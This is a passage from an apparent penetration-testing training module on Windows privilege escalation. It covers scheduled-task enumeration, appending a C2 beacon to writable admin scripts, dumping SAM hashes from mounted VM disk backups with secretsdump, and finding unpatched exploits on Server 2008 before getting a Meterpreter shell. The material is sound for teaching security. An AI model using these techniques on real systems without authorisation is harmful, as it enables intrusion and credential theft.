Folder:</span> \Microsoft\Windows\.NET Framework
<span class="hljs-string">HostName:</span>                             WINLPE-SRV01
<span class="hljs-string">TaskName:</span>                             \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>
Next Run <span class="hljs-string">Time:</span>                        N/A
<span class="hljs-string">Status:</span>                               Ready
Logon <span class="hljs-string">Mode:</span>                           Interactive/Background
Last Run <span class="hljs-string">Time:</span>                        <span class="hljs-number">5</span><span class="hljs-regexp">/27/</span><span class="hljs-number">2021</span> <span class="hljs-number">12</span>:<span class="hljs-number">23</span>:<span class="hljs-number">27</span> PM
Last <span class="hljs-string">Result:</span>                          <span class="hljs-number">0</span>
<span class="hljs-string">Author:</span>                               N/A
Task To <span class="hljs-string">Run:</span>                          COM handler
Start <span class="hljs-string">In:</span>                             N/A
<span class="hljs-string">Comment:</span>                              N/A
Scheduled Task <span class="hljs-string">State:</span>                 Enabled
Idle <span class="hljs-string">Time:</span>                            Disabled
Power <span class="hljs-string">Management:</span>                     Stop On Battery Mode, No Start On Batteries
Run As <span class="hljs-string">User:</span>                          SYSTEM
Delete Task If Not <span class="hljs-string">Rescheduled:</span>       Disabled
Stop Task If Runs X Hours and X <span class="hljs-string">Mins:</span> <span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
<span class="hljs-string">Schedule:</span>                             Scheduling data is not available <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span> format.
Schedule <span class="hljs-string">Type:</span>                        On demand only
Start <span class="hljs-string">Time:</span>                           N/A
Start <span class="hljs-string">Date:</span>                           N/A
End <span class="hljs-string">Date:</span>                             N/A
<span class="hljs-string">Days:</span>                                 N/A
<span class="hljs-string">Months:</span>                               N/A
<span class="hljs-string">Repeat:</span> <span class="hljs-string">Every:</span>                        N/A
<span class="hljs-string">Repeat:</span> <span class="hljs-string">Until:</span> <span class="hljs-string">Time:</span>                  N/A
<span class="hljs-string">Repeat:</span> <span class="hljs-string">Until:</span> <span class="hljs-string">Duration:</span>              N/A
<span class="hljs-string">Repeat:</span> Stop If Still <span class="hljs-string">Running:</span>        N/A

&lt;SNIP&gt;
</code></pre>
<p><strong>Enumerating Scheduled Tasks with PowerShell</strong></p>
<p>We can also enumerate scheduled tasks using the <a href="https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2019-ps">Get-ScheduledTask</a> PowerShell cmdlet.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-ScheduledTask | select TaskName,State

TaskName                                                State
--------                                                -----
<span class="hljs-meta">.NET</span> Framework NGEN v4<span class="hljs-meta">.0</span><span class="hljs-meta">.30319</span>                          Ready
<span class="hljs-meta">.NET</span> Framework NGEN v4<span class="hljs-meta">.0</span><span class="hljs-meta">.30319</span> <span class="hljs-number">64</span>                       Ready
<span class="hljs-meta">.NET</span> Framework NGEN v4<span class="hljs-meta">.0</span><span class="hljs-meta">.30319</span> <span class="hljs-number">64</span> Critical           Disabled
<span class="hljs-meta">.NET</span> Framework NGEN v4<span class="hljs-meta">.0</span><span class="hljs-meta">.30319</span> Critical              Disabled
AD RMS Rights Policy Template Management (Automated) Disabled
AD RMS Rights Policy Template Management (Manual)       Ready
PolicyConverter                                      Disabled
SmartScreenSpecific                                     Ready
VerifiedPublisherCertStoreCheck                      Disabled
Microsoft Compatibility Appraiser                       Ready
ProgramDataUpdater                                      Ready
StartupAppTask                                          Ready
appuriverifierdaily                                     Ready
appuriverifierinstall                                   Ready
CleanupTemporaryState                                   Ready
DsSvcCleanup                                            Ready
Pre-staged app cleanup                               Disabled

&lt;SNIP&gt;
</code></pre>
<p>By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in <code>C:\Windows\System32\Tasks</code>, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.</p>
<p><strong>Checking Permissions on C:\Scripts Directory</strong></p>
<p>Consider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable <code>C:\Scripts</code> directory that we overlooked in our initial enumeration.</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> .<span class="hljs-string">\accesschk64.exe</span> /accepteula -s -d C:<span class="hljs-string">\Scripts\</span>

Accesschk v6.<span class="hljs-number">13</span> - Reports effective permissions <span class="hljs-keyword">for</span> securable objects
Copyright ⌐ <span class="hljs-number">2006</span>-<span class="hljs-number">2020</span> Mark Russinovich
Sysinternals - www.sysinternals.com

C:<span class="hljs-string">\Scripts</span>
  RW BUILTIN<span class="hljs-string">\Users</span>
  RW NT AUTHORITY<span class="hljs-string">\SYSTEM</span>
  RW BUILTIN<span class="hljs-string">\Administrators</span>
</code></pre>
<p>We notice various scripts in this directory, such as <code>db-backup.ps1</code>, <code>mailbox-backup.ps1</code>, etc., which are also all writeable by the <code>BUILTIN\USERS</code> group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as <code>NT AUTHORITY\SYSTEM</code> on the DB01 host. We can now safely assume that one of the backup scripts ran overnight and ran our appended code in the process. This is an example of how important even the slightest bit of information we uncover during enumeration can be to the success of our engagement. Enumeration and post-exploitation during an assessment are iterative processes. Each time we perform the same task across different systems, we may be gaining more pieces of the puzzle that, when put together, will get us to our goal.</p>
<hr>
<h3 id="user-computer-description-field">User/Computer Description Field</h3>
<p><strong>Checking Local User Description Field</strong></p>
<p>Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user&#39;s account description field. We can enumerate this quickly for local users using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser?view=powershell-5.1">Get-LocalUser</a> cmdlet.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-keyword">Get</span>-LocalUser

Name            Enabled Description
----            ------- -----------
Administrator   <span class="hljs-literal">True</span>    Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> administering the computer/domain
DefaultAccount  <span class="hljs-literal">False</span>   A user account managed <span class="hljs-keyword">by</span> the system.
Guest           <span class="hljs-literal">False</span>   Built-<span class="hljs-keyword">in</span> account <span class="hljs-keyword">for</span> guest access <span class="hljs-keyword">to</span> the computer/domain
helpdesk        <span class="hljs-literal">True</span>
htb-student     <span class="hljs-literal">True</span>
htb-student_adm <span class="hljs-literal">True</span>
jordan          <span class="hljs-literal">True</span>
logger          <span class="hljs-literal">True</span>
sarah           <span class="hljs-literal">True</span>
sccm_svc        <span class="hljs-literal">True</span>
secsvc          <span class="hljs-literal">True</span>    Network scanner - <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> change password
sql_dev         <span class="hljs-literal">True</span>
</code></pre>
<p><strong>Enumerating Computer Description Field with Get-WmiObject Cmdlet</strong></p>
<p>We can also enumerate the computer description field via PowerShell using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> cmdlet with the <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem">Win32_OperatingSystem</a> class.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-WmiObject -Class Win32<span class="hljs-emphasis">_OperatingSystem | select Description

</span><span class="hljs-section">Description
-----------</span>
The most vulnerable box ever!
</code></pre>
<hr>
<h3 id="mount-vhdx-vmdk">Mount VHDX/VMDK</h3>
<p>During our enumeration, we will often come across interesting files both locally and on network share drives. We may find passwords, SSH keys or other data that can be used to further our access. The tool <a href="https://github.com/SnaffCon/Snaffler">Snaffler</a> can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase &quot;pass&quot; in the file name, KeePass database files, SSH keys, web.config files, and many more.</p>
<p>Three specific file types of interest are <code>.vhd</code>, <code>.vhdx</code>, and <code>.vmdk</code> files. These are <code>Virtual Hard Disk</code>, <code>Virtual Hard Disk v2</code> (both used by Hyper-V), and <code>Virtual Machine Disk</code> (used by VMware). Let&#39;s assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of <code>.VMDK</code> and <code>.VHDX</code> files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user&#39;s NTLM password hash or Kerberos TGT ticket and take over the domain.</p>
<p>If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.</p>
<p><strong>Mount VMDK on Linux</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ guestmount -<span class="hljs-selector-tag">a</span> SQL01-disk1<span class="hljs-selector-class">.vmdk</span> -<span class="hljs-selector-tag">i</span> --ro /mnt/vmdk
</code></pre>
<p><strong>Mount VHD/VHDX on Linux</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ guestmount --add WEBSRV10.vhdx  --ro /</span>mnt<span class="hljs-regexp">/vhdx/</span> -m <span class="hljs-regexp">/dev/</span>sda1
</code></pre>
<p>In Windows, we can right-click on the file and choose <code>Mount</code>, or use the <code>Disk Management</code> utility to mount a <code>.vhd</code> or <code>.vhdx</code> file. If preferred, we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps">Mount-VHD</a> PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/mount.png" alt="image"></p>
<p>For a <code>.vmdk</code> file, we can right-click and choose <code>Map Virtual Disk</code> from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system&#39;s files and directories. If this fails, we can use VMWare Workstation <code>File --&gt; Map Virtual Disks</code> to map the disk onto our base system. We could also add the <code>.vmdk</code> file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use <code>7-Zip</code> to extract data from a .<code>vmdk</code> file. This <a href="https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/">guide</a> illustrates many methods for gaining access to the files on a <code>.vmdk</code> file.</p>
<p><strong>Retrieving Hashes using Secretsdump.py</strong></p>
<p>Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the <code>C:\Windows\System32\Config</code> directory and pull down the <code>SAM</code>, <code>SECURITY</code> and <code>SYSTEM</code> registry hives. We can then use a tool such as <a href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py">secretsdump</a> to extract the password hashes for local users.</p>
<p>Miscellaneous Techniques</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.23</span>.dev1+<span class="hljs-number">20201209.133255</span>.ac307704 - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[*] Target system <span class="hljs-string">bootKey:</span> <span class="hljs-number">0x35fb33959c691334c2e4297207eeeeba</span>
[*] Dumping local SAM hashes (<span class="hljs-string">uid:</span><span class="hljs-string">rid:</span><span class="hljs-string">lmhash:</span>nthash)
<span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">cf3a5525ee9414229e66279623ed5c58:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
<span class="hljs-string">DefaultAccount:</span><span class="hljs-number">503</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cfe0d16ae931b73c59d7e0c089c0:</span>::
[*] Dumping cached domain logon information (domain/<span class="hljs-string">username:</span>hash)

&lt;SNIP&gt;
</code></pre>
<p>We may get lucky and retrieve the local administrator password hash for the target system or find an old local administrator password hash that works on other systems in the environment (both of which I have done on quite a few assessments).</p>
<h2 id="legacy-operating-systems">Legacy Operating Systems</h2>
<hr>
<p>While this module primarily focuses on modern operating systems (Windows 10/Windows Server 2016), as we have seen, certain issues (i.e., vulnerable software, misconfigurations, careless users, etc.) cannot be solved by merely upgrading to the latest and greatest Windows desktop and server versions. That being said, specific security improvements have been made over the years that no longer affect modern, supported versions of the Windows operating system. During our assessments, we will undoubtedly encounter legacy operating systems (especially against large organizations such as universities, hospitals/medical organizations, insurance companies, utilities, state/local government). It is essential to understand the differences and certain additional flaws that we need to check to ensure our assessments are as thorough as possible.</p>
<hr>
<h3 id="end-of-life-systems-eol-">End of Life Systems (EOL)</h3>
<p>Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. When they stop supporting a version of Windows, they stop releasing security updates for the version in question. Windows systems first go into an &quot;extended support&quot; period before being classified as end-of-life or no longer officially supported. Microsoft continues to create security updates for these systems offered to large organizations through custom long-term support contracts. Below is a list of popular Windows versions and their end of life dates:</p>
<p><strong>Windows Desktop - EOL Dates by Version</strong></p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows XP</td>
<td>April 8, 2014</td>
</tr>
<tr>
<td>Windows Vista</td>
<td>April 11, 2017</td>
</tr>
<tr>
<td>Windows 7</td>
<td>January 14, 2020</td>
</tr>
<tr>
<td>Windows 8</td>
<td>January 12, 2016</td>
</tr>
<tr>
<td>Windows 8.1</td>
<td>January 10, 2023</td>
</tr>
<tr>
<td>Windows 10 release 1507</td>
<td>May 9, 2017</td>
</tr>
<tr>
<td>Windows 10 release 1703</td>
<td>October 9, 2018</td>
</tr>
<tr>
<td>Windows 10 release 1809</td>
<td>November 10, 2020</td>
</tr>
<tr>
<td>Windows 10 release 1903</td>
<td>December 8, 2020</td>
</tr>
<tr>
<td>Windows 10 release 1909</td>
<td>May 11, 2021</td>
</tr>
<tr>
<td>Windows 10 release 2004</td>
<td>December 14, 2021</td>
</tr>
<tr>
<td>Windows 10 release 20H2</td>
<td>May 10, 2022</td>
</tr>
</tbody>
</table>
<p><strong>Windows Server - EOL Dates by Version</strong></p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows Server 2003</td>
<td>April 8, 2014</td>
</tr>
<tr>
<td>Windows Server 2003 R2</td>
<td>July 14, 2015</td>
</tr>
<tr>
<td>Windows Server 2008</td>
<td>January 14, 2020</td>
</tr>
<tr>
<td>Windows Server 2008 R2</td>
<td>January 14, 2020</td>
</tr>
<tr>
<td>Windows Server 2012</td>
<td>October 10, 2023</td>
</tr>
<tr>
<td>Windows Server 2012 R2</td>
<td>October 10, 2023</td>
</tr>
<tr>
<td>Windows Server 2016</td>
<td>January 12, 2027</td>
</tr>
<tr>
<td>Windows Server 2019</td>
<td>January 9, 2029</td>
</tr>
</tbody>
</table>
<p>This <a href="https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/">page</a> has a more detailed listing of the end-of-life dates for Microsoft Windows and other products such as Exchange, SQL Server, and Microsoft Office, all of which we may run into during our assessments.</p>
<hr>
<h3 id="impact">Impact</h3>
<p>When operating systems are set to end of life and are no longer officially supported, there are many issues that may present themselves:</p>
<table><thead><tr><th width="222">Issue</th><th>Description</th></tr></thead><tbody><tr><td>Lack of support from software companies</td><td>Certain applications (such as web browsers and other essential applications) may cease to work once a version of Windows is no longer officially supported.</td></tr><tr><td>Hardware issues</td><td>Newer hardware components will likely stop working on legacy systems.</td></tr><tr><td>Security flaws</td><td>This is the big one with a few notable exceptions (such as <a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1350">CVE-2020-1350</a> (SIGRed) or EternalBlue (<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0144">CVE-2017-0144</a>)) which were easily exploitable and &quot;wormable&quot; security flaws which affected thousands of systems worldwide (including critical infrastructure such as hospitals). Microsoft will no longer release security updates for end-of-life systems. This could leave the systems open to remote code execution and privilege escalation flaws that will remain unpatched until the system is upgraded or retired.</td></tr></tbody></table>

<p>In some instances, it is difficult or impossible for an organization to upgrade or retire an end-of-life system due to cost and personnel constraints. The system may be running mission-critical software no longer supported by the original vendor. This is common in medical settings and local government, where the vendor for a critical application goes out of business or no longer provides support for an application, so the organization is stuck running it on a version of Windows XP or even Server 2000/2003. If we discover this during an assessment, it is best to discuss with the client to understand the business reasons why they cannot upgrade or retire the system(s) and suggest solutions such as strict network segmentation to isolate these systems until they can be dealt with appropriately.</p>
<p>As penetration testers, we will often come across legacy operating systems. Though I do not see many hosts running server 2000 or Windows XP workstations vulnerable to <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">MS08-067</a>, they exist, and I come across them on occasion. It is more common to see a few Server 2003 hosts and 2008 hosts. When we come across these systems, they are often vulnerable to one or multiple remote code execution flaws or local privilege escalation vectors. They can be a great foothold into the environment. However, when attacking them, we should always check with the client to ensure they are not fragile hosts running mission-critical applications that could cause a massive outage. There are several security protections in newer Windows operating system versions that do not exist in legacy versions, making our privilege escalation tasks much more straightforward.</p>
<p>There are some notable differences among older and newer versions of Windows operating system versions. While this module aims to teach local privilege escalation techniques that can be used against modern Windows OS versions, we would be remiss in not going over some of the key differences between the most common versions. The core of the module focuses on various versions of Windows 10, Server 2016, and 2019, but let&#39;s take a trip down memory lane and analyze both a Windows 7 and a Server 2008 system from the perspective of a penetration tester with the goal of picking out key differences that are crucial during assessments of large environments.</p>
<h2 id="windows-server">Windows Server</h2>
<hr>
<p>Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.</p>
<hr>
<h3 id="server-2008-vs-newer-versions">Server 2008 vs. Newer Versions</h3>
<p>The table below shows some notable differences between Server 2008 and the latest Windows Server versions.</p>
<table>
<thead>
<tr>
<th>Feature</th>
<th>Server 2008 R2</th>
<th>Server 2012 R2</th>
<th>Server 2016</th>
<th>Server 2019</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection">Enhanced Windows Defender Advanced Threat Protection (ATP)</a></td>
<td></td>
<td></td>
<td></td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1">Just Enough Administration</a></td>
<td>Partial</td>
<td>Partial</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard">Credential Guard</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard">Remote Credential Guard</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419">Device Guard (code integrity)</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview">AppLocker</a></td>
<td>Partial</td>
<td>X</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://www.microsoft.com/en-us/windows/comprehensive-security">Windows Defender</a></td>
<td>Partial</td>
<td>Partial</td>
<td>X</td>
<td>X</td>
</tr>
<tr>
<td><a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a></td>
<td></td>
<td></td>
<td>X</td>
<td>X</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="server-2008-case-study">Server 2008 Case Study</h3>
<p>Often during my assessments, I come across legacy operating system versions, both Windows and Linux. Sometimes these are merely forgotten systems that the client can quickly act on and decommission, while other times, these can be critical systems that can not be easily removed or replaced. Penetration testers need to understand the client&#39;s core business and hold discussions during the assessment, especially when dealing with scanning/enumeration and attacking legacy systems, and during the reporting phase. Not every environment is the same, and we must take many factors into account when writing recommendations for findings and assigning risk ratings. For example, medical settings may be running mission-critical software on Windows XP/7 or Windows Server 2003/2008 systems. Without understanding the reasoning &quot;why,&quot; it is not good enough to merely tell them to remove the systems from the environment. If they are running costly MRI software that the vendor no longer supports, it could cost large sums of money to transition to new systems. In this case, we would have to look at other mitigating controls the client has in place, such as network segmentation, custom extended support from Microsoft, etc.</p>
<p>If we are assessing a client with the latest and greatest protections and find one Server 2008 host that was missed, then it may be as simple as recommending to upgrade or decommission. This could also be the case in environments subject to stringent audit/regulatory requirements where a legacy system could get them a &quot;failing&quot; or low score on their audit and even hold up or force them to lose government funding.</p>
<p>Let&#39;s take a look at a Windows Server 2008 host that we may uncover in a medical setting, large university, or local government office, among others.</p>
<p>For an older OS like Windows Server 2008, we can use an enumeration script like <a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> to look for missing patches. We can also use something like <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>, which takes the results of the <code>systeminfo</code> command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target. If an exploit exists in the Metasploit framework for the given missing patch, the tool will suggest it. Other enumeration scripts can assist us with this, or we can even enumerate the patch level manually and perform our own research. This may be necessary if there are limitations in loading tools on the target host or saving command output.</p>
<p><strong>Querying Current Patch Level</strong></p>
<p>Let&#39;s first use WMI to check for missing KBs.</p>
<p>Windows Server</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wmic qfe

Caption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=<span class="hljs-number">2533552</span>  WINLPE-<span class="hljs-number">2</span>K8  Update                    KB<span class="hljs-number">2533552</span>               WINLPE-<span class="hljs-number">2</span>K8\Administrator  <span class="hljs-number">3/31/2021</span>
</code></pre>
<p>A quick Google search of the last installed hotfix shows us that this system is very far out of date.</p>
<p><strong>Running Sherlock</strong></p>
<p>Let&#39;s run Sherlock to gather more information.</p>
<p>Windows Server</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described <span class="hljs-keyword">in</span> the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS <span class="hljs-string">C:</span>\htb&gt; Import-Module .\Sherlock.ps1
PS <span class="hljs-string">C:</span>\htb&gt; Find-AllVulns

<span class="hljs-string">Title      :</span> User Mode to Ring (KiTrap0D)
<span class="hljs-string">MSBulletin :</span> MS10<span class="hljs-number">-015</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2010</span><span class="hljs-number">-0232</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/11199/</span>
<span class="hljs-string">VulnStatus :</span> Not supported on <span class="hljs-number">64</span>-bit systems

<span class="hljs-string">Title      :</span> Task Scheduler .XML
<span class="hljs-string">MSBulletin :</span> MS10<span class="hljs-number">-092</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2010</span><span class="hljs-number">-3338</span>, <span class="hljs-number">2010</span><span class="hljs-number">-3888</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/19930/</span>
<span class="hljs-string">VulnStatus :</span> Appears Vulnerable

<span class="hljs-string">Title      :</span> NTUserMessageCall Win32k Kernel Pool Overflow
<span class="hljs-string">MSBulletin :</span> MS13<span class="hljs-number">-053</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2013</span><span class="hljs-number">-1300</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/33213/</span>
<span class="hljs-string">VulnStatus :</span> Not supported on <span class="hljs-number">64</span>-bit systems

<span class="hljs-string">Title      :</span> TrackPopupMenuEx Win32k NULL Page
<span class="hljs-string">MSBulletin :</span> MS13<span class="hljs-number">-081</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2013</span><span class="hljs-number">-3881</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/31576/</span>
<span class="hljs-string">VulnStatus :</span> Not supported on <span class="hljs-number">64</span>-bit systems

<span class="hljs-string">Title      :</span> TrackPopupMenu Win32k Null Pointer Dereference
<span class="hljs-string">MSBulletin :</span> MS14<span class="hljs-number">-058</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2014</span><span class="hljs-number">-4113</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/35101/</span>
<span class="hljs-string">VulnStatus :</span> Not Vulnerable

<span class="hljs-string">Title      :</span> ClientCopyImage Win32k
<span class="hljs-string">MSBulletin :</span> MS15<span class="hljs-number">-051</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2015</span><span class="hljs-number">-1701</span>, <span class="hljs-number">2015</span><span class="hljs-number">-2433</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/37367/</span>
<span class="hljs-string">VulnStatus :</span> Appears Vulnerable

<span class="hljs-string">Title      :</span> Font Driver Buffer Overflow
<span class="hljs-string">MSBulletin :</span> MS15<span class="hljs-number">-078</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2015</span><span class="hljs-number">-2426</span>, <span class="hljs-number">2015</span><span class="hljs-number">-2433</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/38222/</span>
<span class="hljs-string">VulnStatus :</span> Not Vulnerable

<span class="hljs-string">Title      :</span> <span class="hljs-string">'mrxdav.sys'</span> WebDAV
<span class="hljs-string">MSBulletin :</span> MS16<span class="hljs-number">-016</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2016</span><span class="hljs-number">-0051</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/40085/</span>
<span class="hljs-string">VulnStatus :</span> Not supported on <span class="hljs-number">64</span>-bit systems

<span class="hljs-string">Title      :</span> Secondary Logon Handle
<span class="hljs-string">MSBulletin :</span> MS16<span class="hljs-number">-032</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2016</span><span class="hljs-number">-0099</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//www.exploit-db.com/exploits/39719/</span>
<span class="hljs-string">VulnStatus :</span> Appears Vulnerable

<span class="hljs-string">Title      :</span> Windows Kernel-Mode Drivers EoP
<span class="hljs-string">MSBulletin :</span> MS16<span class="hljs-number">-034</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2016</span><span class="hljs-number">-0093</span><span class="hljs-regexp">/94/</span><span class="hljs-number">95</span>/<span class="hljs-number">96</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/SecWiki/windows-kernel-exploits/thttps://us-cert.cisa.gov/ncas/alerts/aa20-133aree/master/MS16-034?</span>
<span class="hljs-string">VulnStatus :</span> Not Vulnerable

<span class="hljs-string">Title      :</span> Win32k Elevation of Privilege
<span class="hljs-string">MSBulletin :</span> MS16<span class="hljs-number">-135</span>
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2016</span><span class="hljs-number">-7255</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</span>
<span class="hljs-string">VulnStatus :</span> Not Vulnerable

<span class="hljs-string">Title      :</span> Nessus Agent <span class="hljs-number">6.6</span><span class="hljs-number">.2</span> - <span class="hljs-number">6.10</span><span class="hljs-number">.3</span>
<span class="hljs-string">MSBulletin :</span> N/A
<span class="hljs-string">CVEID      :</span> <span class="hljs-number">2017</span><span class="hljs-number">-7199</span>
<span class="hljs-string">Link       :</span> <span class="hljs-string">https:</span><span class="hljs-comment">//aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html</span>
<span class="hljs-string">VulnStatus :</span> Not Vulnerable
</code></pre>
<p><strong>Obtaining a Meterpreter Shell</strong></p>
<p>From the output, we can see several missing patches. From here, let&#39;s get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs. First, we need to obtain a <code>Meterpreter</code> reverse shell. We can do this several ways, but one easy way is using the <code>smb_delivery</code> module.</p>
<p>Windows Server</p>
<pre><code class="lang-shell-session">msf6 exploit(windows/smb/smb_delivery) &gt; search smb_delivery

Matching Modules
================
